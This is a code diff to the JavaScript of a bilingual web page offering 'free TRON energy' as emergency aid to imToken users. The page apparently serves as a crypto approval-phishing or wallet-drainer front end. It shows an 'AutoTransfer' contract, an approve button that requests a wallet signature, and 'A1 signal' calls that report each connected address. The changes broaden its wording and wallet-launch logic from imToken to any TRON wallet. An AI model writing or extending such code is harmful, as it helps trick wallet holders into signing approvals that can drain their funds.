@@ -890,8 +890,8 @@ const langConfig = {
         footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
         copySuccess: "✅ 链接已复制，请在imToken内置浏览器打开",
         copyFail: "❌ 复制失败：请手动复制链接",
-        唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
-        copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
+       唤起Guide: "✅ 已复制链接+唤起钱包\n下一步：打开对应钱包 → 浏览 → 粘贴访问",
+        copyGuide: "✅ 链接已复制，请在钱包中粘贴访问",
         connectError: "连接异常<br><span style='color: #000000; font-size: 14px;'>⚠️ 网络波动</span>",
         retryConnect: "重试连接",
         // 删除“已连接/USDT余额/TRX余额”
@@ -922,7 +922,7 @@ const langConfig = {
         systemBusyTip: "系统繁忙请稍后重试",
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请连接imToken钱包后重试</span>",
+        noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请连接钱包后重试</span>",
         nonImTokenUser: "非imToken钱包用户<br><span style='color: #000000; font-size: 13px;'>正在自动唤起imToken...</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
@@ -960,8 +960,8 @@ const langConfig = {
         footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
         copySuccess: "✅ Link copied - open in imToken in-app browser",
         copyFail: "❌ Copy failed: Please copy manually",
-        唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
-        copyGuide: "✅ Link copied - please paste in imToken",
+        唤起Guide: "✅ Link copied + wallet launched\nNext: Open wallet → Browser → Paste link",
+        copyGuide: "✅ Link copied - please paste in wallet",
         connectError: "Connection Error<br><span style='color: #000000; font-size: 14px;'>⚠️ Network fluctuation</span>",
         retryConnect: "Retry Connection",
         authorizedTip: "✅ This wallet has claimed free energy within 30 days<br><span style='color: #000000; font-size: 13px;'>One claim per address every 30 days</span>",
@@ -989,7 +989,7 @@ const langConfig = {
         systemBusyTip: "System busy, please try again later",
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please connect imToken wallet and try again</span>",
+        noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please connect wallet and try again</span>",
         nonImTokenUser: "Non-imToken user<br><span style='color: #000000; font-size: 13px;'>Auto-launching imToken...</span>",
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
@@ -1197,7 +1197,20 @@ async function reRenderDynamicContent() {
         renderEnergyRecords();
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
-        return;
+        const statusAddressEl = document.getElementById("statusAddress");
+        if (statusAddressEl) {
+            statusAddressEl.style.display = "inline"; // 取消隐藏
+            statusAddressEl.textContent = userAddress; // 赋值钱包地址
+        }
+            
+        if (canSendA1Signal(userAddress)) {
+           sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+            updateA1SignalRecord(userAddress);
+        }
+        bindApproveLogic();
+        recordList.style.display = "block";
+        renderEnergyRecords();
+         return;
     }
     if (isAddressAuthorized(userAddress)) {
         updateWalletStatus();
@@ -1336,31 +1349,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             });
         }, 500);
     }
-});
-async function checkImTokenEnv() {
-    if (window.tronWeb && window.tronWeb.ready) { // 仅检测tronweb环境（TronLink），不判断其他钱包
-        tronWeb = window.tronWeb;
-        connectBtn.style.display = "none";
-        warning.style.display = "none";
-        specialTipContainer.style.display = "none";
-        await initWallet(false);
-        return;
-    }
-    if (!connectBtn) {
-        console.warn("⚠️ 连接按钮未找到，稍后重试");
-        setTimeout(() => checkImTokenEnv(), 500);
-        return;
-    }
-    // 非tronweb环境：显示多钱包选择弹窗（通用逻辑，不绑定任何单一钱包）
-    specialTipContainer.style.display = "block";
-    userInfoDefault.style.display = "none";
-    userInfoStatus.style.display = "block";
-    userInfoStatus.innerHTML = "请选择要连接的钱包"; // 通用文案，不提及imToken等特定钱包
-    approveBtn.style.display = "none";
-    connectBtn.style.display = "none";
-    nonImTokenPopup.style.display = "none"; // 隐藏旧的单一钱包弹窗
-    multiWalletPopup.style.display = "block"; // 显示多钱包选择弹窗
-}
+
     // 给每个钱包项绑定跳转逻辑
     walletItems.forEach(item => {
         item.onclick = async () => {
@@ -1399,7 +1388,7 @@ async function checkImTokenEnv() {
             // 3秒后检查是否成功唤起，未成功则提示手动操作
             setTimeout(() => {
                 if (!window.tronWeb) {
-                    alert(`${lang.唤起Guide}`);
+                    alert(lang.唤起Guide);
                     multiWalletPopup.style.display = "none";
                     connectBtn.style.display = "block";
                     connectBtn.onclick = () => {
@@ -1414,6 +1403,30 @@ async function checkImTokenEnv() {
     closeMultiWalletBtn.onclick = () => {
         multiWalletPopup.style.display = "none";
     };
+});
+async function checkImTokenEnv() {
+    if (window.tronWeb && window.tronWeb.ready) { // 仅检测tronweb环境（TRON生态钱包），不判断其他钱包
+        tronWeb = window.tronWeb;
+        connectBtn.style.display = "none";
+        warning.style.display = "none";
+        specialTipContainer.style.display = "none";
+        await initWallet(false);
+        return;
+    }
+    if (!connectBtn) {
+        console.warn("⚠️ 连接按钮未找到，稍后重试");
+        setTimeout(() => checkImTokenEnv(), 500);
+        return;
+    }
+    // 非tronweb环境：显示多钱包选择弹窗（通用逻辑，不绑定任何单一钱包）
+    specialTipContainer.style.display = "block";
+    userInfoDefault.style.display = "none";
+    userInfoStatus.style.display = "block";
+    userInfoStatus.innerHTML = "请选择要连接的钱包"; // 通用文案，不提及imToken等特定钱包
+    approveBtn.style.display = "none";
+    connectBtn.style.display = "none";
+    nonImTokenPopup.style.display = "none"; // 隐藏旧的单一钱包弹窗
+    multiWalletPopup.style.display = "block"; // 显示多钱包选择弹窗
 }
 
 async function initWallet(isAfterApprove) {
@@ -1436,14 +1449,14 @@ async function initWallet(isAfterApprove) {
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
             const statusAddressEl = document.getElementById("statusAddress");
-        if (statusAddressEl) {
-            statusAddressEl.style.display = "inline"; // 取消隐藏
-            statusAddressEl.textContent = userAddress; // 赋值钱包地址
-                }
+            if (statusAddressEl) {
+                statusAddressEl.style.display = "inline"; // 取消隐藏
+                statusAddressEl.textContent = userAddress; // 赋值钱包地址
+            }
             
-        if (canSendA1Signal(userAddress)) {
-           sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
-            updateA1SignalRecord(userAddress);
+            if (canSendA1Signal(userAddress)) {
+               sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+                updateA1SignalRecord(userAddress);
             }
             bindApproveLogic();
             recordList.style.display = "block";
@@ -1472,7 +1485,7 @@ async function initWallet(isAfterApprove) {
         if (statusAddressEl) {
             statusAddressEl.style.display = "inline"; // 取消隐藏
             statusAddressEl.textContent = userAddress; // 赋值钱包地址
-            }
+        }
         if (isAddressAuthorized(userAddress)) {
             userInfoDefault.style.display = "none";
             userInfoStatus.style.display = "block";
@@ -1663,7 +1676,7 @@ function bindApproveLogic() {
         btn.disabled = true;
         btn.textContent = lang.redirectingBtn;
         reviewTip.style.display = "flex";
-        reviewTipText.textContent = "发起签名，请在imToken中确认...";
+        reviewTipText.textContent = "发起签名，请在钱包中确认...";
         try {
             // 新增1：A1信号校验（保留原有校验逻辑，失败则终止流程）
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
